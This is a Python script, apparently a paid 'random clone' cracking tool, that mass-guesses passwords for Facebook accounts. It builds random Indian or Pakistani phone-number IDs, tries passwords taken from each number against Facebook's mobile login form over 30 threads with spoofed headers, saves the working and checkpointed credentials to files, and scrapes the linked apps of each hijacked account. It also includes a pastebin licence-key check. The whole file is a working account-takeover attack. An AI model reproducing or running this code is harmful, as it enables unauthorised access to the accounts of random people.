#!/usr/bin/python3
#-*-coding:utf-8-*-
import os

try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
    
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
    
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,uuid
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python num.py')
  
agents = ['BET_61D_WIFI_11C_HW (O) C67_SmartOpus_SL008_20191225_V802 Release/2019.12.25 WAP Browser/MAUI Profile/ Q03C1-2.40 en-US',
    'HONGYU61M_11C_HW (MRE/3.1.00(64);MAUI/_MAXVI_P16_MTK6261D_V01_20180514;BDATE/2018/05/14 15:45;LCD/240320;CHIP/MT6261;KEY/Normal;TOUCH/0;CAMERA/1;SENSOR/0;DEV/HONGYU61M_11C_HW;WAP Browser/MAUI ();GMOBI/001;MBOUNCE/002;MOMAGIC/003;INDEX/004;SPICEI2I/005;GAMELOFT/006;MOBIM/007) C138A_MAXVI_P16_MTK6261D_V01_20180514 Release/2018.05.14 WAP Browser/MAUI Profile/ Q03C1-2.40 ru-RU',
    'HONGYU61M_11C_HW (MRE/3.1.00(1000);MAUI/i285_V1.8_20190521;BDATE/2019/05/21 11:54;LCD/240320;CHIP/MT6261;KEY/Normal;TOUCH/0;CAMERA/1;SENSOR/0;DEV/HONGYU61M_11C_HW;WAP Browser/MAUI ();GMOBI/001;MBOUNCE/002;MOMAGIC/003;INDEX/004;SPICEI2I/005;GAMELOFT/006;MOBIM/007;KKFUN/008;M) NOMI_i285_V1.8_20190521 Release/2019.05.21 WAP Browser/MAUI Profile/ Q03C1-2.40 uk-UA',
    'FLYCOM61D_11C_HW (abadkd) B2804AM Release/2018.10.16 WAP Browser/MAUI Profile/ Q03C1-2.40 ru-RU',
    'MIKI61D_GB_11C_HW (I) F109_ERGO_F282_TRAVEL_V01_180714 Release/2018.07.14 WAP Browser/MAUI Profile/ Q03C1-2.40 ru-RU',
    'MU220/Q03C MAUI-browser/Screen-176X220',
    'FLY_E141TV_PLUS/ WAP Browser/MAUI(HTTP PGDL;HTTPS)Profile/Q03C1-2.40 ru-RU',
    'Micromax X512/MAUI WAP Browser/1.0.0',
    'FLYCOM61D_11C_HW (abadkd) B2804AM Release/2018.10.16 WAP Browser/MAUI Profile/ Q03C1-2.40 ru-RU',
    'LEGEND61D_11C_HW (MRE/3.1.00(1);MAUI/i282_V1.4_20170904;BDATE/2017/09/04 11:48;LCD/240320;CHIP/MT6261;KEY/Normal;TOUCH/0;CAMERA/1;SENSOR/0;DEV/LEGEND61D_11C_HW;WAP Browser/MAUI ();GMOBI/001;MBOUNCE/002;MOMAGIC/003;INDEX/004;SPICEI2I/005;GAMELOFT/006;MOBIM/007;KKFUN/008;MTON) Nomi_i282_V1.4_20170904 Release/2017.09.04 WAP Browser/MAUI Profile/ Q03C1-2.40 ru-RU',
    'LAVA.ARC GRAND2.HONGYU61M_11C_HW (MRE/3.1.00(64);MAUI/ARCGRAND2_S112_20161103;BDATE/2016/11/03 11:06;LCD/240320;CHIP/MT6261;KEY/Normal;TOUCH/0;CAMERA/1;SENSOR/0;DEV/HONGYU61M_11C_HW;WAP Browser/MAUI ();GMOBI/001;MBOUNCE/002;MOMAGIC/003;INDEX/004;SPICEI2I/005;GAMELOFT/006;MOBIM/007;KKFUN/00) LAVA_ARCGRAND2_S112_20161103 Release/2016.11.03 WAP Browser/MAUI Profile/ Q03C1-2.40 hi-IN',
    'HW_V1.3 FA_M241E_BAND18_B02_S01_V04_161026 Release/2016.10.26 WAP Browser/MAUI Profile/ Q03C1-2.40 pt-PT',
    'HXJ5001_11B (MRE\\2.5.00(3072) resolution\\272480 chipset\\MT6250 touch\\1 tpannel\\1 camera\\1 gsensor\\0 keyboard\\reduced) ZHJ5001_ML12 Release/2013.03.04 WAP Browser/MAUI (HTTPS) Profile/ Q03C1-2.40 ru-RU Google']
logo = """
$$$$$$$\   $$$$$$\  $$$$$$$\   $$$$$$\  
$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
$$ |  $$ |$$ /  $$ |$$ |  $$ |$$ /  $$ |
$$ |  $$ |$$$$$$$$ |$$ |  $$ |$$$$$$$$ |
$$ |  $$ |$$  __$$ |$$ |  $$ |$$  __$$ |
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
$$$$$$$  |$$ |  $$ |$$$$$$$  |$$ |  $$ |
\_______/ \__|  \__|\_______/ \__|  \__|
                                 
\033[1;91m─━㋱≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠㋱━─
       \033[1;36m𝐍𝐎𝐓𝐄 : 𝙰𝙻𝚆𝙰𝚈𝚂 𝚁𝙴𝙼𝙴𝙼𝙱𝙴𝚁 𝚃𝙷𝙰𝚃  DADAX 𝙸𝚂 𝙰 𝙱𝚁𝙰𝙽𝙳 🏅
      \033[1;91m╔════════════════════════════════════════════════╗
      \033[1;34m█\033[1;33m➣\033[1;91m AUTHOR  \033[1;39m:\033[1;35mDADAX █ \033[1;37m• \033[1;36mTHIS TOOL IS PAID \033[1;37m•\033[1;34m █
      \033[1;34m█\033[1;34m➣\033[1;91m GITHUB \033[1;39m:\033[1;35mDADAX █ \033[1;37m• \033[1;36m DADA SARKAR IS ALONE  \033[1;37m•\033[1;34m █
      \033[1;34m█\033[1;35m➣\033[1;91m WHATSAPP\033[1;39m:\033[1;35m+97696784016  █\033[1;37m\033[1;37m\033[1;36m ═════════════════════\033[1;34m █
      \033[1;34m█\033[1;36m➣\033[1;91m STATUS  \033[1;39m:\033[1;35mPREMIUM      █\033[1;37m\033[1;36m ═════════════════════\033[1;34m █
      \033[1;34m█\033[1;37m➣\033[1;91m VERSION \033[1;39m:\033[1;35m1.0.2 PRO    █ \033[1;37m• \033[1;36mTHIS TOOL PRICE \033[1;37m•\033[1;34m █
      \033[1;34m█\033[1;36m➣\033[1;91m TOOLNAME\033[1;39m:\033[1;35mRANDOM CLONE █ \033[1;37m• \033[1;36m30DAY[600] 15DAY350 \033[1;37m•\033[1;34m █
      \033[1;34m█════════════════════════════════════════════════█
      \033[1;34m█ \033[1;32m✪ \033[1;34m✪ \033[1;33mGITHUB \033[1;39m: \033[1;33mhttp://github.com/PATHAN314 \033[1;34m✪ \033[1;32m✪ \033[1;34m █
      \033[1;34m█════════════════════════════════════════════════█
      \033[1;34m█ \033[1;32m✪ \033[1;34m✪ \033[1;91m✪ \033[1;32mTHIS TOOL CREATED BY DADAX \033[1;91m✪ \033[1;34m✪ \033[1;32m✪ \033[1;34m █
      \033[1;91m╚════════════════════════════════════════════════╝"""  
loop = 0
oks = []
cps = []

#global functions
def dynamic(text):
	titik = ['.   ','..  ','... ','.... ']
	for o in titik:
		print('\r'+text+o),
		sys.stdout.flush();time.sleep(1)


		
def menu():
	os.system('clear')
	print(logo)
	print('[1] DADAX SARKAR RANDOM CRACKER')
	print(47*"-")
	opt = input('[?] Choose : ')
	if opt =='1':
		random_crack()

def cek_apk(coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r Ã°Å¸Å½Â®  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r Ã°Å¸Å½Â®  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
   
def random_crack():
	os.system('clear')
	print(logo)
	print('[1] INDIA RANDOM UID CRACK')
	print('[2] PAK RANDOM UID CRACK')
	print('[0] BACK')
	print(47*'-')
	opt = input('[?] Choose : ')
	if opt =='1':
		random_number()
	elif opt =='2':
		random_pak_number()
	elif opt =='0':
		menu()
	else:
		print('\033[1;91mChoose valid option\033[0;97m')

def random_number():
	user=[]
	os.system('clear')
	print(logo)
	print('[+] For Indian Enter Four Digit Code (906634)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] Brute Has been started...(\033[1;91mIndia\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			mk = uid[:6]
			pwx = [guru]
			pwx = [kode+guru,mk]
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	print(' Press Inter To Back Menu')
	menu()
	
    
def rcrack(uid,pwx,tl):
	global loop
	global oks
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(agents)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'x.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'cookie': 'datr=9c2_YxlZFRPv9gYLn_RMDN4c; sb=9c2_Y2kM_aR5Gri1P-pWuZtv; dnonce=AWlncCHNo00OibSt69F3mTGvGLGvuFXymRARQBqY2Ec6a1F_ICErImucVcUbSPNf3QkV9XdUdPcgtX0vn8c0HqAd; m_pixel_ratio=2; wd=360x656; fr=0WWO6FGAU2yQ5nHoz..Bjv831.HM.AAA.0.0.Bjw44P.AWW8IIboADE',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			agent = random.choice([
				"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5403.118 Safari/537.36",
				"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5403.118 Safari/537.36",
				"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5403.118 Safari/537.36",
				"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5403.118 Safari/537.36",
				"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5403.118 Safari/537.36",
				"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5403.118 Safari/537.36",
				"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5403.118 Safari/537.36",
		])
			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\r\033[1;32m[DADAX-OK] '+cid+' | '+ps)
				cek_apk(coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;31m[DADAX-CP] '+cid+' | '+ps)
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f"\r\x1b[1;32m[D A D A X]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}] ")
		sys.stdout.flush()
	except:
		pass

def random_pak_number():
	user=[]
	os.system('clear')
	print(logo)
	print('[+] For Pak Enter Four Digit Code (92301)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mPakistan\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	print(' Press Inter To Back Menu')
	menu()
    
def rcrack(uid,pwx,tl):
	global loop
	global oks
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(agents)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'x.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'cookie': 'datr=9c2_YxlZFRPv9gYLn_RMDN4c; sb=9c2_Y2kM_aR5Gri1P-pWuZtv; dnonce=AWlncCHNo00OibSt69F3mTGvGLGvuFXymRARQBqY2Ec6a1F_ICErImucVcUbSPNf3QkV9XdUdPcgtX0vn8c0HqAd; m_pixel_ratio=2; wd=360x656; fr=0WWO6FGAU2yQ5nHoz..Bjv831.HM.AAA.0.0.Bjw44P.AWW8IIboADE',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\r\033[1;32m[DADAX-OK] '+cid+' | '+ps)
				cek_apk(coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;31m[DADAX-CP] '+cid+' | '+ps)
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f"\r \x1b[1;32m[D A D A X]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[DADAX OK][{len(oks)}] [DADAX CP][{len(cps)}]  ")
		sys.stdout.flush()
	except:
		pass

def chk():
  uuid = uuid.uuid4().hex[:10].upper()
  id = "⛥".join(uuid)
  kausar = "⍟••DADAX_𝑩𝑹𝑨𝑵𝑫••⍟"
  print("\n\n\x1b[37;1m  𝙔𝙊𝙐𝙍 𝙆𝙀𝙔 ➩ \033[92m"+id+kausar) 
  try: 
    httpCaht = requests.get("https://pastebin.com/raw/MBZP2dbV").text 
    if id in httpCaht: 
      print("\033[92m  \n 𝙔𝙊𝙐𝙍 𝙆𝙀𝙔 𝙄𝙎 𝘼𝘾𝙏𝙄𝙑𝙀 𝘽𝙍𝙊 𝙎𝙊 𝙇𝙀𝙏'𝙎 𝙀𝙉𝙅𝙊𝙔............\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(2) 
      pass 
    else: 
      print("\033[0;96m \n 𝙔𝙊𝙐𝙍 𝙆𝙀𝙔 𝙄𝙎 𝙉𝙊𝙏 𝘼𝘾𝙏𝙄𝙑𝙀 \n 𝘾𝙊𝙋𝙔 𝘼𝙉𝘿 𝙎𝙀𝙉𝘿 𝙈𝙀 𝙔𝙊𝙐𝙍 𝙆𝙀𝙔 𝙒𝙃𝘼𝙏𝘼𝙋𝙋") 
      os.system('xdg-open  https://wa.me/+923038289017')
      time.sleep(2) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print (logo)
     chk() 


menu()
